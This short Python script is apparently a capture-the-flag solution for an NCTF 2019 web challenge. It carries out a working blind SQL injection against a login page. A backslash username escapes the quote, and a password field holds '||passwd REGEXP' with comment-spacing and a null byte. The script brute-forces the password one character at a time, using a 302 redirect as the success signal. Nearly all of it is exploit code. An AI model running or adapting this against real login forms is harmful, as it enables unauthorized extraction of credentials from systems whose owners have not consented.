'''http://wiki.merak.codes/writeup/NJUPT-2019'''
import requests

'''select * from users where username='\' and passwd='||passwd/**/REGEXP/**/"^y";
\ escape the second ', make username = ' and passwd=, then OR(||) passwd regexp "^flag"
'''
url = "http://nctf2019.x1ct34m.com:40005/index.php"
proxies = {'http': 'http://127.0.0.1:8080'}
flag = ""
k = 0
list = "qwertyuiopasdfghjklzxcvbnm_0123456789"
while True:
    k+= 1
    print k,
    for i in list:
        ret = requests.post(url,data={
            "passwd":"""||passwd/**/REGEXP/**/"^\\{}";\x00""".format(flag+i), #passwd=||passwd/**/REGEXP/**/"^y";\0
            "username":'\\' #username=\
        }, allow_redirects=False) #,proxies=proxies)
        if ret.status_code == 302:
            print """||passwd/**/REGEXP/**/"^\\{}";\x00""".format(flag+i)
            flag += i
            print flag
            break